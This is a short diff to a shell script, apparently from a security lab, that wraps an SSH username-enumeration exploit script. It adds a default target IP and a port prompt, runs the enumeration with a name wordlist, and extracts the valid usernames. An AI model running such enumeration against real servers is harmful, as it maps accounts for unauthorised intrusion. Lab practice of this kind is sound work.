@@ -16,10 +16,19 @@
 # default port of ssh
 defPort=22
 
+# default ip adress
+defIpAdress=10.0.2.6
+
 # read user input of ip adres of server
 echo "Input Ip adress of server"
 
-read IpAdress
+read ipAdress
+
+# if input is empty use default ip adress
+if [ -z "$ipAdress" ];
+then
+	ipAdress=$defIpAdress
+fi
 
 # read user input of port when blank default port is define
 echo "Input port if blank default is 22"
@@ -40,5 +49,6 @@ then
 fi
 
 echo $port
-#python 45233 --port $port --userList fewnames.txt --outputFile chc.txt $IpAdress
-
+python ./enum/ssh_user_enum.py --port $port --userList fewnames.txt --outputFile allusers.txt $ipAdress
+grep 'is a valid user' allusers.txt |cut -d' ' -f1 >validUsers.txt
+head validUsers.txt
